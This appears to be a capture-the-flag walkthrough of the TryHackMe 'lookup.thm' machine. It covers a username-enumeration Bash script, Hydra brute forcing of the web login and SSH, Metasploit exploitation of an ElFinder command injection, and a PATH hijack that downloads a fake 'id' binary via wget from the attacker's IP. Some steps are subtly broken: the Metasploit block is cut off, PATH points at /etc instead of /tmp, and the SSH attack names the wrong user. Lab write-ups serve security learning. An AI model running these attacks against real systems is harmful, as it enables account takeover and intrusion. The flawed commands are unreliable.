Welcome to this detailed walkthrough, where I will describe the step-by-step through the exploitation process of the "lookup.thm" machine on TryHackMe. This guide is designed for security enthusiasts.

Now, let's dive into the attack process! ðŸš€

## Step-by-Step Guide  

### Connect to the Lab
Connect to the lab using the **VPN** or **AttackBox**.  

### Reconnaissance
Use the THM machine's IP address to perform reconnaissance with the following commands:  
```bash
whatweb -a <IP-ADRESS-THM-VM>
nmap -F <IP-ADRESS-THM-VM>
```

### Resolving Domain
During the previous step, the `whatweb` command identified that the vulnerable IP resolves to the domain **"lookup.thm"**. It is necessary to associate this domain with the IP by adding it to the `/etc/hosts` file.  

### Access the Login Page
Access the **lookup.thm** webpage, where a login panel is found.  

### Analyzing Login Requests
After analyzing and intercepting the login request, we identified different error messages when entering a valid username. As shown in the images below, we can bruteforce valid usernames.

![Wrong Password](assets/img/THM/Lookup-Writeup/wrong-password.png)

### Identifying Valid Usernames
Using this information, we will identify valid usernames using the `curl` command and the following simple Bash script:  
```bash
#!/bin/bash

# Objetive
url="http://lookup.thm/login.php"

# wordlists
file_path="/usr/share/seclists/Usernames/Names/names.txt"

# wordlist exists? if not use custom or download seclists in this case works
if [[ ! -f "$file_path" ]]; then
    echo "Error: El archivo $file_path no existe."
    exit 1
fi

# test with the wordlist
while IFS= read -r username; do
    username="$(echo -n "$username" | tr -d '\r')"
    
    if [[ -z "$username" ]]; then
        continue
    fi

    # POST data message with curl
    response=$(curl -s -X POST "$url" \
        -d "username=$username" \
        -d "password=password")
    
    # Verify response
    if [[ "$response" == *"Wrong password"* ]]; then
        echo "Usuario encontrado: $username"
    fi
    # ignore "wrong username"
done < "$file_path"
```

### HTTP POST Brute Force Attack with Hydra
With the collected information, we perform a brute-force attack using **Hydra** with the following command:  
```bash
hydra -l jose -P passwords.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong"
```

**BOOM!** A valid password has been found, as shown below:

![Jose Valid Password](assets/img/THM/Lookup-Writeup/password-found.png)

### Logging In
We log in using this password. The login is successful; however, it redirects to the subdomain **"files.lookup.thm"**. Again, we must associate this domain with the assigned IP by editing the `/etc/hosts` file.  

### Exploring File Manager
Upon accessing, we find a **file management panel (ElFinder)**. We proceed to check its version as follow.

![ElFinder Version](assets/img/THM/Lookup-Writeup/elFinder-version.png)

### Checking for Vulnerabilities
Using **searchsploit**, we verify if this version is vulnerable. It turns out to be susceptible to **Command Injection** via a PHP connector.

### Exploiting the Vulnerability with Metasploit
To save time, we will use **Metasploit** to exploit this vulnerability with the following command sequence.

```bash
 msfconsole -q
msf6 > search elfinder

### Accessing as www-data
Now, we have access as the user **"www-data"**. To escalate privileges, we check the `/home` directory, where we find a user named **"think"**. Inside their folder, we locate the first flag: `user.txt`.


### Finding an Uncommon Binary

We attempt to escalate further using the following command to check for **SUID binaries**.

```bash
find / -perm /4000 2>/dev/null
```

A non-standard binary is found at **"/usr/sbin/pwm"**. Running this binary, we observe that it calls the `id` command to retrieve the username and then reads the `.passwords` file from that user's home directory.  

### Exploiting Binary Behavior
Exploiting this behavior, we can manipulate the console by creating a modified version of the `id` command to impersonate the **"think"** user. However, first, we examine `/etc/passwd` to gather additional information as what users can use the console.  

We save our custom `id` version in the `/tmp` directory and modify the **PATH** environment variable using the following commands:  
```bash
cd /tmp
wget http://your-ip:90/id
cat id
#!/bin/bash
echo "uid=33(think) gid=33(think) groups=33(think)"
export PATH=/etc:$PATH
chmod +x id
```

By doing this, we can access the **.passwords** file, which contains historical or potential passwords for this user.

```bash
pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
password1
password2
....
```

### SSH Brute-Force Attack
With this in mind, we perform an **SSH brute-force attack** using **Hydra** and the `.passwords` file found earlier.

```bash
hydra -l jose -P .passwords ssh://<target_ip> -V
```

**Bingo!** We can now use this password to log in via SSH as the **think** user.

### Retrieving the User Flag
After completing this step, we obtain the **"user.txt"** flag.

```bash
cat user.txt
```

### Root Privilege Escalation
Finally, we explore privilege escalation techniques. Running `sudo -l`, we see that **think** can execute the `look` command as a superuser.  

### Exploiting Look Command
Checking **GTFOBins**, we find that `look` can be leveraged to read files. Using this, we read the root user's flag from `/root/root.txt`.
